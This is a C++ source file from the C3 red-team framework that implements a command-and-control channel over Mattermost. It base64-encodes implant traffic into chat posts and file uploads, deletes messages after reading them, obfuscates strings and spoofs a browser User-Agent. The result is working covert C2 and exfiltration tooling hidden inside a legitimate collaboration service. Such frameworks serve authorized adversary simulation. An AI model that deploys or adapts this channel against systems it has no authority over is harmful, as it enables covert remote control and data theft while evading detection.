#include "Stdafx.h"
#include "Mattermost.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/WinHttp/Uri.h"

using namespace FSecure::WinHttp;

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Mattermost::Mattermost(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [MattermostServerUrl, MattermostTeamName, MattermostAccessToken, channelName, userAgent] = arguments.Read<std::string, std::string, std::string, std::string, std::string>();
	m_MattermostObj = FSecure::Mattermost{ MattermostServerUrl, MattermostTeamName, MattermostAccessToken, channelName, userAgent };
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Mattermost::OnSendToChannel(ByteView data)
{
    //Begin by creating a message where we can write the data to in a thread, both client and server ignore this message to prevent race conditions
	std::string postID = m_MattermostObj.WritePost(m_outboundDirectionName + OBF(":writing"));

	//this is more than 30 messages, send it as a file (we do this infrequently as file uploads restricted to 20 per minute).
	//Using file upload for staging (~88 messages) is a huge improvement over sending actual replies.
	size_t actualPacketSize = 0;
	if (data.size() > 120'000)
	{
		auto fileID = m_MattermostObj.UploadFile(cppcodec::base64_rfc4648::encode<ByteVector>(data.data(), data.size()));
        m_MattermostObj.WriteReply("", postID, fileID);
		actualPacketSize = data.size();
	}
	else
	{
		//Write the full data into the thread. This makes it a lot easier to read in onRecieve as Mattermost limits messages to 16383 characters.
		constexpr auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(16'380);
		actualPacketSize = std::min(maxPacketSize, data.size());
		auto sendData = data.SubString(0, actualPacketSize);

		m_MattermostObj.WriteReply(cppcodec::base64_rfc4648::encode(sendData.data(), sendData.size()), postID);
	}

	//Update the original first message with "C2S||S2C:Done" - these messages will always be read in onRecieve.
	std::string message = m_outboundDirectionName + OBF(":Done");

	m_MattermostObj.UpdatePost(message, postID);
	return actualPacketSize;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Mattermost::OnReceiveFromChannel()
{
	auto messages = m_MattermostObj.GetMessagesByDirection(m_inboundDirectionName + OBF(":Done"));

	std::vector<ByteVector> ret;

	//Read the messages in reverse order (which is actually from the oldest to newest)
	//Avoids old messages being left behind.
	for (std::vector<std::string>::reverse_iterator postID = messages.rbegin(); postID != messages.rend(); ++postID)
	{
		auto replies = m_MattermostObj.ReadReplies(*postID);
		std::vector<std::string> postIDs;
		std::string message;

		//Get all of the messages from the replies.
		for (auto&& reply : replies)
		{
			message.append(reply.second);
			postIDs.push_back(std::move(reply.first)); //get all of the post_ids for later deletion
		}

		// Base64 decode the entire message
		auto relayMsg = cppcodec::base64_rfc4648::decode(message);
		DeleteReplies(postIDs);
		m_MattermostObj.DeletePost(*postID);
		ret.emplace_back(std::move(relayMsg));
	}

	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Mattermost::DeleteReplies(std::vector<std::string> const & postIDs)
{
	for (auto&& postID : postIDs)
	{
		m_MattermostObj.DeletePost(postID);
	}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Mattermost::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Mattermost Server URL",
				"min": 1,
				"description": "Mattermost Server URL starting with schema, without a trailing slash. E.g. https://my-mattermost.com"
			},
			{
				"type": "string",
				"name": "Mattermost Team Name",
				"min": 1,
				"description": "Mattermost Team Name to create a channel within. Mattermost's Teams are analogy to Slack's Workspaces."
			},
			{
				"type": "string",
				"name": "Mattermost Access Token",
				"min": 1,
				"description": "Mattermost user's Personal Access Token. Example token: chhtxfgmzhfct5qi5si7tiexuc"
			},
			{
				"type": "string",
				"name": "Channel name",
				"min": 6,
				"randomize": true,
				"description": "Name of Mattermost's channel used by api"
			},
			{
				"type": "string",
				"name": "User-Agent Header",
				"min": 1,
				"defaultValue": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
				"description": "The User-Agent header to set"
			}
		]
	},
	"commands": []
}
)_";
}